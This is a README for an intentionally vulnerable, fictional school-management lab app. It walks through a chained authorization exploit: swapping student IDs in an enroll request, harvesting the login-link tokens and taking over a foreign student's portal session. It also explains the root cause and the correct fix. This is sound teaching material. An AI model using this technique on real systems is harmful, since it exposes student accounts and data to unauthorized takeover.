# Campus Relay

Campus Relay is a realistic, fictional school-management application for reproducing a chained authorization failure. Teachers create their own accounts, classes, students, rosters, and login links. There are no seeded users, credentials, classes, students, IDs, or tokens.

> This application is intentionally vulnerable. Run it only on localhost or another explicitly authorized lab environment.

## Run

```bash
npm install
npm start
```

Open <http://127.0.0.1:5070>. To return to a completely empty platform:

```bash
npm run reset
```

## Establish the two school contexts

1. Create teacher account A.
2. Create a class such as `Year 7 Science`.
3. Add a student, open the class, and add that student to its roster.
4. Copy the student ID from the Students page.
5. Sign out and create unrelated teacher account B.
6. Create another class, such as `Year 8 History`, and copy its class ID.

The IDs are random on every run. Keep the second teacher signed in for the API reproduction.

## Reproduce the chain

The normal **Add student** action sends an enrollment request for one of the current teacher's students. Capture it in browser developer tools or a local intercepting proxy, then replace only the student ID in the path with teacher A's student ID:

```http
POST /api/students/<TEACHER_A_STUDENT_ID>/enroll HTTP/1.1
Host: 127.0.0.1:5070
Cookie: relay.sid=<TEACHER_B_SESSION>
Content-Type: application/json

{"classIds":["<TEACHER_B_CLASS_ID>"]}
```

The response is `204`. Refresh teacher B's class: teacher A's student is now on its roster.

Use **Student login links** in that class. The response from the underlying endpoint includes an `/access/{token}` URL for every student on the roster, including the foreign student:

```http
GET /api/classLoginLinks/<TEACHER_B_CLASS_ID> HTTP/1.1
Cookie: relay.sid=<TEACHER_B_SESSION>
```

Open the foreign student's access link in a private browser. The page exchanges the token through an unauthenticated endpoint and follows the returned one-tap URL:

```http
GET /api/studentPortalLogin/<TOKEN> HTTP/1.1
```

After the redirect, the private browser displays the student portal. `GET /api/session` returns `200` with `"type":"student"`. Before consuming the link, that clean context returns `401`.

Expected chain: `204 → 200 → 200 → 302 → 200/session`.

## Why it works

The enrollment handler checks ownership of the destination class but not the source student. The login-link handler then trusts the newly created roster relationship. The safe design must authorize the teacher against both objects before mutation and must not allow a newly grafted relationship to grant login-link issuance automatically.

## Validate

```bash
npm run check
npm audit --audit-level=moderate
```
